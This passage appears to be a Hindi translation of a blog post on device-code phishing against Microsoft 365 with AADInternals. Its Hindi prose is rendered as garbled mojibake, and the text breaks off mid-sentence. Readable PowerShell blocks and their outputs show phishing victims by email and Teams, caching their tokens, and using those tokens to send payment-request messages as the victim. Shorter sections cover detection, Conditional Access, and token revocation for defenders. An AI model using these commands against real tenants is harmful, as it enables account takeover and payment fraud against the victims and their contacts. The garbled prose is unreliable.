рд╣рдо рдЕрдиреНрдп рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рд░рд┐рдлреНрд░реЗрд╢ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рднреА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм рддрдХ рдХрд┐ client\_id рдПрдХ рд╣реА рд░рд╣реЗред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ Exchange Online рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред
```powershell
# Create body for getting access token for Exchange Online

$body=@{
"client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" =    "refresh_token"
"scope" =         "openid"
"resource" =      "https://outlook.office365.com"
"refresh_token" = $response.refresh_token
}

$EXOresponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body $body -ErrorAction SilentlyContinue

# Send email as the victim

Send-AADIntOutlookMessage -AccessToken $EXOresponse.access_token -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
## рдлрд┐рд╢рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП AADInternals рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ <a href="#using-aadinternals-for-phishing" id="using-aadinternals-for-phishing"></a>

AADInternals (v0.4.4 рдпрд╛ рдмрд╛рдж рдХрд╛ рд╕рдВрд╕реНрдХрд░рдг) рдореЗрдВ [Invoke-AADIntPhishing](https://o365blog.com/aadinternals/#invoke-aadintphishing) рдлрдВрдХреНрд╢рди рд╣реИ рдЬреЛ рдлрд┐рд╢рд┐рдВрдЧ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИред

рдлрд┐рд╢рд┐рдВрдЧ рд╕рдВрджреЗрд╢ рдХреЛ рдЕрдиреБрдХреВрд▓рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрджреЗрд╢ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реИ:
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/><br/>Here is a <a href="{1}">link</a> you <b>should not click</b>.<br/><br/>If you still decide to do so, provide the following code when requested: <b>{0}</b>.</div>'
```
рдИрдореЗрд▓ рдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрджреЗрд╢:
![рдлрд┐рд╢рд┐рдВрдЧ рдИрдореЗрд▓](https://o365blog.com/images/posts/phishing\_11.png)

рдЯреАрдореНрд╕ рдореЗрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрджреЗрд╢:
![рдлрд┐рд╢рд┐рдВрдЧ рд╕рдВрджреЗрд╢](https://o365blog.com/images/posts/phishing\_12.png)

### рдИрдореЗрд▓ <a href="#email" id="email"></a>

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рдПрдХ рдХрд╕реНрдЯрдорд╛рдЗрдЬрд╝реНрдб рд╕рдВрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд┐рд╢рд┐рдВрдЧ рдИрдореЗрд▓ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЯреЛрдХрди рдХреИрд╢ рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВред
```powershell
# Create a custom message

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'

# Send a phishing email to recipients using a customised message and save the tokens to cache

Invoke-AADPhishing -Recipients "wvictim@company.com","wvictim2@company.com" -Subject "Johnny shared a document with you" -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local -Message $message -SaveToCache
```

```
Code: CKDZ2BURF
Mail sent to: wvictim@company.com
...
Received access token for william.victim@company.com
```
рдФрд░ рдЕрдм рд╣рдо рдХреИрд╢ рдХрд┐рдП рдЧрдП рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреАрдбрд╝рд┐рдд рдХреЗ рд░реВрдк рдореЗрдВ рдИрдореЗрд▓ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред
```powershell
# Send email as the victim

Send-AADIntOutlookMessage -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
рд╣рдо рдпрд╣рд╛рдВ рдПрдХ рдЯреАрдореНрд╕ рд╕рдВрджреЗрд╢ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рднреБрдЧрддрд╛рди рдЕрдиреБрд░реЛрдз рдФрд░ рдЕрдзрд┐рдХ рддрддреНрдкрд░рддрд╛ рд╕реЗ рд╣реЛ рд╕рдХреЗ:
```powershell
# Send Teams message as the victim

Send-AADIntTeamsMessage -Recipients "another.wictim@target.org" -Message "Just sent you an email about due payment. Have a look at it."
```

```
Sent                MessageID
----                ---------
16/10/2020 14.40.23 132473328207053858
```
**рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╡реАрдбрд┐рдпреЛ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдИрдореЗрд▓ рдлрд┐рд╢рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП AADInternals рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░реЗрдВред**

### Teams <a href="#teams" id="teams"></a>

AADInternals рдЯреАрдореНрд╕ рдЪреИрдЯ рд╕рдВрджреЗрд╢ рдХреЗ рд░реВрдк рдореЗрдВ рдлрд┐рд╢рд┐рдВрдЧ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред

**рдиреЛрдЯ!** рдкреАрдбрд╝рд┐рдд рд╡реНрдпрдХреНрддрд┐ "рдкреНрд░рдорд╛рдгреАрдХреГрдд" рд╣реЛ рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж рдФрд░ рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, AADInternals рдореВрд▓ рд╕рдВрджреЗрд╢ рдХреЛ рдмрджрд▓ рджреЗрдЧрд╛ред рдЗрд╕ рд╕рдВрджреЗрд╢ рдХреЛ -CleanMessage рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рд╛рдл рд╕рдВрджреЗрд╢ рд╣реИ:
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/>If you are seeing this, <b>someone has stolen your identity!</b>.</div>'
```
![Teams clean message](https://o365blog.com/images/posts/phishing\_13.png)

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ рд╕рдВрджреЗрд╢реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд┐рд╢рд┐рдВрдЧ рдИрдореЗрд▓ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЯреЛрдХрди рдХреИрд╢ рдореЗрдВ рд╕рд╣реЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВред
```powershell
# Get access token for Azure Core Management

Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Create the custom messages

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'
$cleanMessage = '<html>Hi!<br/>Have a nice weekend.</html>'

# Send a teams message to the recipient using customised messages

Invoke-AADPhishing -Recipients "wvictim@company.com" -Teams -Message $message -CleanMessage $cleanMessage -SaveToCache
```

```
Code: CKDZ2BURF
Teams message sent to: wvictim@company.com. Message id: 132473151989090816
...
Received access token for william.victim@company.com
```
**рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╡реАрдбрд┐рдпреЛ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдХреИрд╕реЗ AADInternals рдХрд╛ рдЙрдкрдпреЛрдЧ Teams рдлрд┐рд╢рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред**

## рдЦреЛрдЬрдирд╛ <a href="#detecting" id="detecting"></a>

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, Azure AD рдХреЗ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╕реЗ рд▓реЙрдЧрд┐рди рд╡рд╣рд╛рдВ рд╣реЛрддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг **рдкреНрд░рд╛рд░рдВрдн** рд╣реБрдЖ рдерд╛ред рдЗрд╕реЗ рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣ рдПрдХ рдмрд╣реБрдд рдорд╣рддреНрд╡рдкреВрд░реНрдг рдмрд┐рдВрджреБ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╕рд╛рдЗрдирд┐рдВрдЧ рд▓реЙрдЧ рдореЗрдВ, рд▓реЙрдЧрд┐рди **рд╣рдорд▓рд╛рд╡рд░ рд╕реНрдерд╛рди рдФрд░ рдЙрдкрдХрд░рдг** рд╕реЗ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд╣реАрдВред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рддрд╛рдЬрдЧреА рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЧрдП рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди **рд╕рд╛рдЗрдирд┐рдВрдЧ рд▓реЙрдЧ рдореЗрдВ рдирд╣реАрдВ рджрд┐рдЦрд╛рдИ рджреЗрддреЗ рд╣реИрдВ!**

рдиреАрдЪреЗ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ рдЬрд╣рд╛рдВ рдореИрдВрдиреЗ рдлрд┐рд╢рд┐рдВрдЧ рдХреЛ рдПрдХ Azure VM рд╕реЗ рдкреНрд░рд╛рд░рдВрдн рдХрд┐рдпрд╛ (рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ [рдХреНрд▓рд╛рдЙрдб рд╢реИрд▓](https://o365blog.com/post/cloudshell/) рд╕реЗ)ред рдЬреИрд╕рд╛ рдХрд┐ рд╣рдо рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, "рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдСрдлрд┐рд╕" рдХреНрд▓рд╛рдЗрдВрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдЧрд┐рди 7:23 AM рдкрд░ IP-рдкрддреЗ 51.144.240.233 рд╕реЗ рд╣реБрдЖред рд╣рд╛рд▓рд╛рдВрдХрд┐, 7:27 AM рдкрд░ рдПрдХреНрд╕рдЪреЗрдВрдЬ рдСрдирд▓рд╛рдЗрди рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд▓реЙрдЧ рдореЗрдВ рджрд┐рдЦрд╛рдИ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИред

![Azure AD signing log](https://o365blog.com/images/posts/phishing\_10.png)

:warning: рдпрджрд┐ рдРрд╕реЗ рд╕рдВрдХреЗрдд рд╣реИрдВ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЧреИрд░-рд╕рд╛рдорд╛рдиреНрдп рд╕реНрдерд╛рдиреЛрдВ рд╕реЗ рд╕рд╛рдЗрди рдЗрди рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

## рд░реЛрдХрдирд╛ <a href="#preventing" id="preventing"></a>

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд┐рд╢рд┐рдВрдЧ рдХреЛ рд░реЛрдХрдиреЗ рдХрд╛ рдХреЗрд╡рд▓ рдкреНрд░рднрд╛рд╡реА рддрд░реАрдХрд╛ [рд╢рд░реНрддрд╛рдзрд╛рд░рд┐рдд рдкрд╣реБрдБрдЪ](https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview) (CA) рдиреАрддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╕реНрдерд╛рди рдФрд░ рдЙрдкрдХрд░рдг рд╕реНрдерд┐рддрд┐ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдиреАрддрд┐рдпрд╛рдБ рдЦрд╛рддреЛрдВ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП рдкреНрд░рднрд╛рд╡реА рд╣реЛрддреА рд╣реИрдВред рдпрд╣ рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдЙрдкрдпреЛрдЧ рд╣реЛрдиреЗ рд╡рд╛рд▓реА рд╕рднреА рдлрд┐рд╢рд┐рдВрдЧ рддрдХрдиреАрдХреЛрдВ рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рд╣реЛрддрд╛ рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╕рднреА рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЛ рдХрд╡рд░ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЕрд╡реИрдз рд╕реНрдерд╛рдиреЛрдВ рд╕реЗ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП MFA рдХреЛ рдмрд╛рдзреНрдп рдХрд░рдиреЗ рд╕реЗ рдХреЛрдИ рдорджрдж рдирд╣реАрдВ рдорд┐рд▓рддреА рд╣реИ рдЕрдЧрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ MFA рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдЧрд┐рди рдХрд░ рд░рд╣рд╛ рд╣реИред

## рдХрдо рдХрд░рдирд╛ <a href="#mitigating" id="mitigating"></a>

рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЦрд╛рддрд╛ рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рд╣реЛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рддрд╛рдЬрдЧреА рдЯреЛрдХрди рдХреЛ [рд░рджреНрдж](https://docs.microsoft.com/en-us/powershell/module/azuread/revoke-azureaduserallrefreshtoken?view=azureadps-2.0) рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рддрд╛рдЬрдЧреА рдЯреЛрдХрди рдХреЗ рд╕рд╛рде рдирдП рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

## рд╕рд╛рд░рд╛рдВрд╢ <a href="#summary" id="summary"></a>

рдЬрд╣рд╛рдВ рддрдХ рдореБрдЭреЗ рдкрддрд╛ рд╣реИ, рдлрд┐рд╢рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг рддрдХрдиреАрдХ рдХрд╛ рдкрд╣рд▓реЗ рдХрднреА рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╕реЗ, рдЗрд╕ рддрд░реАрдХреЗ рдореЗрдВ рдХреБрдЫ рд▓рд╛рдн рд╣реИрдВ:

* рдХрд┐рд╕реА рднреА рдРрдкреНрд╕ рдХреЛ рдкрдВрдЬреАрдХреГрдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ
* рдирдХрд▓реА рд▓реЙрдЧрд┐рди рдкреЗрдЬ рдХреЗ рд▓рд┐рдП рдлрд┐рд╢рд┐рдВрдЧ рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рд╕реЗрдЯрдЕрдк рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ
* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХреЗрд╡рд▓ рд╕рд╛рдЗрди рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЖрдорддреМрд░ рдкрд░ "рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдСрдлрд┐рд╕" рдореЗрдВ) - рдХреЛрдИ рд╕рд╣рдорддрд┐ рдирд╣реАрдВ рдорд╛рдВрдЧреА рдЬрд╛рддреА рд╣реИ
* рд╕рдм рдХреБрдЫ **login.microsoftonline.com** рдиреЗрдорд╕реНрдкреЗрд╕ рдореЗрдВ рд╣реЛрддрд╛ рд╣реИ
* рд╣рдорд▓рд╛рд╡рд░ рдХрд┐рд╕реА рднреА client\_id рдФрд░ resource рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ (рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╕рднреА рд╕рдВрдпреЛрдЬрди рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ)
* рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ MFA рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рд╛рдЗрди рдЗрди рдХрд░рддрд╛ рд╣реИ, рддреЛ рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдореЗрдВ рднреА MFA рдХрд╛ рджрд╛рд╡рд╛ рд╣реЛрддрд╛ рд╣реИ (рдпрд╣ рддрд╛рдЬрдЧреА рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЧрдП рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рднреА рд╢рд╛рдорд┐рд▓ рд╣реИрдВ)
* рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рд╢рд░реНрддрд╛рдзрд╛рд░рд┐рдд рдкрд╣реБрдБрдЪ (рдФрд░ Azure AD Premium P1/P2 рд▓рд╛рдЗрд╕реЗрдВрд╕) рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ

рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╕реЗ, рдЗрд╕ рддрд░реАрдХреЗ рдореЗрдВ рдХрдо рд╕реЗ рдХрдо рдПрдХ рд╣рд╛рдирд┐ рд╣реИ:

* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛрдб рдХреЗрд╡рд▓ 15 рдорд┐рдирдЯ рдХреЗ рд▓рд┐рдП рдорд╛рдиреНрдп рд╣реЛрддрд╛ рд╣реИ

рдмреЗрд╢рдХ, рд╣рдорд▓рд╛рд╡рд░ рдПрдХрд╛рдзрд┐рдХ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдлрд┐рд╢рд┐рдВрдЧ рдИрдореЗрд▓ рднреЗрдЬрдХрд░ рд╕рдордп рд╕реАрдорд╛ рдХреЛ рдХрдо рдХрд░ рд╕рдХрддрд╛ рд╣реИ - рдЗрд╕рд╕реЗ рдХрд┐рд╕реА рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреЛрдИ рд╕рд╛рдЗрди рдЗрди рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдмрдврд╝ рдЬрд╛рдПрдЧреАред

рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рд╣реИ [рдкреНрд░реЙрдХреНрд╕реА](https://gist.github.com/Mr-Un1k0d3r/afef5a80cb72dfeaa78d14465fb0d333) рдХрд╛ рд▓рд╛рдЧреВ рдХрд░рдирд╛, рдЬреЛ рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ рдкрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╢реБрд░реВ рдХрд░реЗрдЧрд╛ (рдХреНрд░реЗрдбрд┐рдЯреНрд╕ [@MrUn1k0d3r](https://twitter.com
